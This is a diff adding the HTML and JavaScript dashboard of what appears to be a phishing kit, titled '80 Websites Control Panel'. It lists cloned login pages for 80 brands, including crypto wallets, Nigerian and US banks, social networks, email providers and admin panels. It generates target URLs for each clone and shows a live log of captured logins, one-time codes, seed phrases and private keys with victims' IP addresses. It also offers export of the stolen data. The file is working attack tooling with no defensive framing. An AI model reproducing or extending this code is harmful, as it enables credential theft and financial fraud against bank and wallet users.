@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>80 Websites Control Panel</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+:root{--bg:#08080c;--card:#14141c;--border:#26262f;--text:#fff;--dim:#8a8a9e;--mid:#b8b8c8;--accent:#e53935;--green:#16a34a;--blue:#3b82f6;--purple:#8b5cf6;--yellow:#eab308}
+body{background:var(--bg);color:var(--text);min-height:100vh;padding:20px}
+.container{max-width:1280px;margin:0 auto}
+.header{text-align:center;padding:30px 20px 20px}
+.title{font-size:28px;font-weight:900;background:linear-gradient(90deg,#fff,#e53935,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:3px}
+.subtitle{color:var(--dim);font-size:12px;margin-top:10px;letter-spacing:3px;text-transform:uppercase}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin:30px 0}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px;text-align:center}
+.stat-value{font-size:26px;font-weight:900;color:var(--accent)}
+.stat-value.green{color:var(--green)}.stat-value.blue{color:var(--blue)}.stat-value.purple{color:var(--purple)}
+.stat-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1.5px;margin-top:6px}
+.tabs-main{display:flex;gap:8px;margin-bottom:24px;background:var(--card);padding:6px;border-radius:12px;border:1px solid var(--border)}
+.tab-main{flex:1;padding:12px;text-align:center;font-size:13px;font-weight:700;border-radius:8px;cursor:pointer;color:var(--dim);text-transform:uppercase;letter-spacing:1px;transition:all .2s}
+.tab-main.active{background:var(--accent);color:#fff}
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:14px;margin-bottom:30px}
+.cat-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:22px;cursor:pointer;transition:all .25s;position:relative;overflow:hidden}
+.cat-card:hover{border-color:var(--cat-color);transform:translateY(-4px)}
+.cat-icon{width:48px;height:48px;border-radius:12px;background:var(--cat-color);display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:14px}
+.cat-name{font-size:15px;font-weight:800;text-transform:capitalize;margin-bottom:4px}
+.cat-count{font-size:11px;color:var(--dim)}
+.site-panel{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:26px;margin-bottom:20px;display:none}
+.site-panel.active{display:block}
+.site-panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid var(--border)}
+.site-panel-title{font-size:18px;font-weight:800;text-transform:capitalize}
+.site-panel-title span{color:var(--accent)}
+.close-btn{background:transparent;border:1px solid var(--border);color:var(--dim);width:34px;height:34px;border-radius:10px;cursor:pointer}
+.site-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
+.site-item{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:14px 16px;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:10px;text-transform:capitalize}
+.site-item:hover{border-color:var(--accent);background:rgba(229,57,53,.06)}
+.site-item.selected{border-color:var(--green);background:rgba(22,163,74,.1)}
+.site-dot{width:8px;height:8px;border-radius:50%;background:var(--dim)}
+.site-item.selected .site-dot{background:var(--green)}
+.site-name{font-size:13px;font-weight:600}
+.server-panel{background:#0e1a12;border:1px solid var(--green);border-radius:16px;padding:26px;margin-top:20px;display:none}
+.server-panel.active{display:block}
+.server-header{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+.status-dot{width:12px;height:12px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.server-title{font-size:15px;font-weight:800;color:var(--green);letter-spacing:2px;text-transform:uppercase}
+.url-box{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:14px 16px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.url-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-bottom:4px}
+.url-value{font-family:'Courier New',monospace;font-size:14px;color:var(--blue);word-break:break-all;font-weight:600}
+.copy-btn{background:var(--border);border:none;color:var(--text);padding:8px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700}
+.copy-btn:hover{background:var(--accent)}
+.server-actions{display:flex;gap:10px;margin-top:18px;flex-wrap:wrap}
+.action-btn{flex:1;min-width:160px;padding:14px;border:none;border-radius:10px;font-size:13px;font-weight:800;cursor:pointer;letter-spacing:1.5px;text-transform:uppercase}
+.action-btn.stop{background:var(--accent);color:#fff}
+.action-btn.open{background:var(--blue);color:#fff}
+.log-list{display:flex;flex-direction:column;gap:10px;max-height:600px;overflow-y:auto;padding-right:6px}
+.log-entry{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--accent);border-radius:10px;padding:14px 16px}
+.log-entry.visit{border-left-color:var(--dim)}
+.log-entry.crypto{border-left-color:#f6851b}
+.log-entry.otp{border-left-color:var(--yellow)}
+.log-entry.login{border-left-color:var(--blue)}
+.log-entry.admin{border-left-color:var(--purple)}
+.log-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:8px;flex-wrap:wrap}
+.log-site{font-size:13px;font-weight:800;text-transform:capitalize}
+.log-site .cat{font-size:10px;color:var(--dim);font-weight:500;margin-left:6px;text-transform:uppercase}
+.log-time{font-size:10px;color:var(--dim);font-family:monospace}
+.log-type{display:inline-block;font-size:10px;font-weight:700;padding:3px 8px;border-radius:6px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+.log-type.visit{background:rgba(138,138,158,.15);color:var(--dim)}
+.log-type.crypto{background:rgba(246,133,27,.15);color:#f6851b}
+.log-type.otp{background:rgba(234,179,8,.15);color:var(--yellow)}
+.log-type.login{background:rgba(59,130,246,.15);color:var(--blue)}
+.log-type.admin{background:rgba(139,92,246,.15);color:var(--purple)}
+.log-data{font-family:'Courier New',monospace;font-size:12px;color:var(--mid);line-height:1.6;word-break:break-all;background:var(--bg);padding:10px 12px;border-radius:8px;margin-top:6px}
+.log-data .k{color:var(--green);font-weight:700}
+.log-meta{font-size:10px;color:var(--dim);margin-top:6px;display:flex;gap:12px;flex-wrap:wrap}
+.empty-log{text-align:center;padding:60px 20px;color:var(--dim)}
+.empty-log .icon{font-size:48px;margin-bottom:16px;opacity:.5}
+.log-toolbar{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap}
+.log-toolbar button{flex:1;min-width:140px;padding:12px;border:none;border-radius:10px;font-size:12px;font-weight:800;cursor:pointer;letter-spacing:1.5px;text-transform:uppercase;color:#fff}
+.btn-refresh{background:var(--blue)}
+.btn-export{background:var(--green)}
+.btn-clear{background:var(--accent)}
+.section-title{font-size:12px;font-weight:800;color:var(--dim);text-transform:uppercase;letter-spacing:3px;margin:30px 0 16px}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(120px);background:var(--green);color:#fff;padding:14px 28px;border-radius:12px;font-size:13px;font-weight:700;opacity:0;transition:all .35s;z-index:1000}
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+@media(max-width:600px){.cat-grid,.site-grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}.action-btn,.log-toolbar button{min-width:100%}.title{font-size:18px}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1 class="title">80 WEBSITES CONTROL PANEL</h1>
+<p class="subtitle">Deploy · Capture · Monitor</p>
+</div>
+<div class="stats">
+<div class="stat"><div class="stat-value" id="stat-cats">8</div><div class="stat-label">Categories</div></div>
+<div class="stat"><div class="stat-value blue" id="stat-sites">80</div><div class="stat-label">Websites</div></div>
+<div class="stat"><div class="stat-value purple" id="stat-captures">0</div><div class="stat-label">Captures</div></div>
+<div class="stat"><div class="stat-value green">data.json</div><div class="stat-label">Storage</div></div>
+</div>
+<div class="tabs-main">
+<div class="tab-main active" onclick="switchMainTab(0,event)">Deploy</div>
+<div class="tab-main" onclick="switchMainTab(1,event)">Activity Log <span id="logBadge" style="display:none;background:#e53935;color:#fff;padding:2px 8px;border-radius:10px;font-size:10px;margin-left:6px">0</span></div>
+</div>
+<div id="tab-deploy">
+<div class="section-title">Select Category</div>
+<div class="cat-grid" id="catGrid"></div>
+<div class="site-panel" id="sitePanel">
+<div class="site-panel-header">
+<div class="site-panel-title">Websites in <span id="currentCat"></span></div>
+<button class="close-btn" onclick="closeSitePanel()">✕</button>
+</div>
+<div class="site-grid" id="siteGrid"></div>
+</div>
+<div class="server-panel" id="serverPanel">
+<div class="server-header"><div class="status-dot"></div><div class="server-title">Server Running</div></div>
+<div class="url-box"><div><div class="url-label">Target URL</div><div class="url-value" id="localUrl">—</div></div><button class="copy-btn" onclick="copyUrl('localUrl')">Copy</button></div>
+<div class="url-box"><div><div class="url-label">Selected Target</div><div class="url-value" id="selectedTarget">None</div></div><button class="copy-btn" onclick="copyUrl('selectedTarget')">Copy</button></div>
+<div class="server-actions">
+<button class="action-btn open" onclick="openSite()">Open Target</button>
+<button class="action-btn stop" onclick="stopServer()">Close Panel</button>
+</div>
+</div>
+</div>
+<div id="tab-log" style="display:none">
+<div class="section-title">Captured Activity <span style="color:var(--green);font-size:10px">● LIVE (auto-refresh 3s)</span></div>
+<div class="log-toolbar">
+<button class="btn-refresh" onclick="renderLog()">🔄 Refresh Now</button>
+<button class="btn-export" onclick="exportLog()">⬇ Download data.json</button>
+<button class="btn-clear" onclick="clearLog()">🗑 Clear File</button>
+</div>
+<div class="log-list" id="logList"></div>
+</div>
+</div>
+<div class="toast" id="toast">Copied!</div>
+<script>
+const CATEGORIES = {
+crypto:{icon:'₿',color:'#f6851b',sites:['metamask','trust_wallet','coinbase','binance','phantom','exodus','ledger','trezor','crypto_com','kucoin']},
+nigerian_banks:{icon:'🇳🇬',color:'#e30613',sites:['gtbank','zenith','access','firstbank','uba','fidelity','union','sterling','stanbic','polaris']},
+usa_banks:{icon:'🇺🇸',color:'#117aca',sites:['chase','bank_of_america','wells_fargo','citibank','capital_one','us_bank','pnc','td_bank','truist','amex']},
+local_companies:{icon:'🏢',color:'#ffcc00',sites:['dangote','mtn','glo','airtel','9mobile','jumia','konga','paystack','flutterwave','opay']},
+social_media:{icon:'💬',color:'#1877f2',sites:['facebook','instagram','twitter','tiktok','snapchat','linkedin','reddit','pinterest','tumblr','whatsapp']},
+email_tech:{icon:'📧',color:'#4285f4',sites:['google','microsoft','apple','yahoo','protonmail','dropbox','github','gitlab','adobe','slack']},
+entertainment:{icon:'🎬',color:'#e50914',sites:['netflix','spotify','amazon','paypal','ebay','disney','hulu','twitch','discord','telegram']},
+admin_panel:{icon:'🛡️',color:'#8b5cf6',sites:['admin1','admin2','admin3','admin4','admin5','admin6','admin7','admin8','admin9','admin10']}
+};
+let currentCategory=null, currentSite=null;
+function prettyName(n){return n.split('_').map(w=>w.charAt(0).toUpperCase()+w.slice(1)).join(' ')}
+function switchMainTab(i,e){
+  if(e)e.preventDefault();
+  document.querySelectorAll('.tab-main').forEach((t,idx)=>t.classList.toggle('active',idx===i));
+  document.getElementById('tab-deploy').style.display=i===0?'block':'none';
+  document.getElementById('tab-log').style.display=i===1?'block':'none';
+  if(i===1)renderLog();
+}
+function renderCategories(){
+  const g=document.getElementById('catGrid');g.innerHTML='';
+  Object.entries(CATEGORIES).forEach(([k,v])=>{
+    const c=document.createElement('div');
+    c.className='cat-card';c.style.setProperty('--cat-color',v.color);
+    c.innerHTML=`<div class="cat-icon">${v.icon}</div><div class="cat-name">${prettyName(k)}</div><div class="cat-count">${v.sites.length} websites</div>`;
+    c.onclick=()=>showSites(k);
+    g.appendChild(c);
+  });
+}
+function showSites(cat){
+  currentCategory=cat;
+  document.getElementById('currentCat').textContent=prettyName(cat);
+  const g=document.getElementById('siteGrid');g.innerHTML='';
+  CATEGORIES[cat].sites.forEach(s=>{
+    const i=document.createElement('div');
+    i.className='site-item';
+    i.innerHTML=`<div class="site-dot"></div><div class="site-name">${prettyName(s)}</div>`;
+    i.onclick=()=>selectSite(s,i);
+    g.appendChild(i);
+  });
+  document.getElementById('sitePanel').classList.add('active');
+  document.getElementById('serverPanel').classList.remove('active');
+}
+function closeSitePanel(){
+  document.getElementById('sitePanel').classList.remove('active');
+  document.getElementById('serverPanel').classList.remove('active');
+}
+function selectSite(site,el){
+  document.querySelectorAll('.site-item').forEach(i=>i.classList.remove('selected'));
+  el.classList.add('selected');currentSite=site;
+  setTimeout(()=>deployServer(site),200);
+}
+function deployServer(site){
+  document.getElementById('serverPanel').classList.add('active');
+  const origin = window.location.origin;
+  const p = `${currentCategory}/${site}/`;
+  document.getElementById('localUrl').textContent = `${origin}/${p}`;
+  document.getElementById('selectedTarget').textContent = `${prettyName(currentCategory)} → ${prettyName(site)}`;
+}
+function copyUrl(id){
+  const t=document.getElementById(id).textContent;
+  navigator.clipboard.writeText(t).then(()=>showToast('Copied: '+t.slice(0,40))).catch(()=>showToast('Copy failed'));
+}
+function openSite(){if(currentCategory&&currentSite)window.open(`${currentCategory}/${currentSite}/index.html`,'_blank')}
+function stopServer(){
+  document.getElementById('serverPanel').classList.remove('active');
+  document.getElementById('sitePanel').classList.remove('active');
+  showToast('Panel closed');currentCategory=null;currentSite=null;
+}
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2500);
+}
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c])}
+
+async function loadData(){
+  try{
+    const r = await fetch('/data.json?_=' + Date.now());
+    if(!r.ok) throw new Error('HTTP '+r.status);
+    const data = await r.json();
+    return Array.isArray(data) ? data : [];
+  }catch(e){console.error('load error',e);return[]}
+}
+function renderLog(){
+  loadData().then(log=>{
+    const list=document.getElementById('logList');
+    const badge=document.getElementById('logBadge');
+    document.getElementById('stat-captures').textContent = log.filter(e=>e.type!=='VISIT').length;
+    if(log.length>0){badge.style.display='inline-block';badge.textContent=log.length}
+    else{badge.style.display='none'}
+    if(log.length===0){
+      list.innerHTML='<div class="empty-log"><div class="icon">📭</div><p>No captures yet.</p><small>Data will appear here as targets submit forms. Stored in <b>data.json</b> on the server.</small></div>';
+      return;
+    }
+    list.innerHTML='';
+    log.forEach(en=>{
+      const t = (en.type||'').toUpperCase();
+      const tc = t==='VISIT'?'visit':t==='OTP'?'otp':t==='ADMIN'?'admin':(t.includes('SEED')||t.includes('PRIVATE'))?'crypto':'login';
+      const el=document.createElement('div');
+      el.className='log-entry '+tc;
+      let d='';
+      if(typeof en.data==='object' && en.data!==null){
+        d=Object.entries(en.data).map(([k,v])=>`<div><span class="k">${esc(k)}:</span> ${esc(String(v))}</div>`).join('');
+      } else { d=esc(String(en.data)); }
+      el.innerHTML=`
+        <div class="log-top">
+          <div class="log-site">${prettyName(en.site||'?')}<span class="cat">${prettyName(en.category||'?')}</span></div>
+          <div class="log-time">${en.time?new Date(en.time).toLocaleString():''}</div>
+        </div>
+        <div class="log-type ${tc}">${esc(en.type||'DATA')}</div>
+        <div class="log-data">${d}</div>
+        <div class="log-meta"><span>IP: ${esc(en.ip||'?')}</span><span>ID: ${esc(en.id||'?')}</span></div>
+      `;
+      list.appendChild(el);
+    });
+  });
+}
+async function exportLog(){
+  const log = await loadData();
+  if(log.length===0){showToast('Nothing to export');return}
+  const b=new Blob([JSON.stringify(log,null,2)],{type:'application/json'});
+  const u=URL.createObjectURL(b);const a=document.createElement('a');
+  a.href=u;a.download=`data_${Date.now()}.json`;a.click();URL.revokeObjectURL(u);
+  showToast(`Exported ${log.length} entries`);
+}
+async function clearLog(){
+  if(!confirm('Clear ALL captured data from data.json? This cannot be undone.'))return;
+  try{
+    const r = await fetch('/clear', {method:'POST'});
+    const j = await r.json();
+    showToast(j.ok ? '✅ Cleared' : '❌ Failed');
+    renderLog();
+  }catch(e){showToast('Failed to clear')}
+}
+renderCategories();
+document.getElementById('stat-cats').textContent=Object.keys(CATEGORIES).length;
+document.getElementById('stat-sites').textContent=Object.values(CATEGORIES).reduce((a,b)=>a+b.sites.length,0);
+renderLog();
+setInterval(()=>{if(document.getElementById('tab-log').style.display!=='none')renderLog()},3000);
+setInterval(()=>{
+  loadData().then(log=>{
+    const badge=document.getElementById('logBadge');
+    if(log.length>0){badge.style.display='inline-block';badge.textContent=log.length}
+    document.getElementById('stat-captures').textContent = log.filter(e=>e.type!=='VISIT').length;
+  });
+},5000);
+</script>
+</body>
+</html>
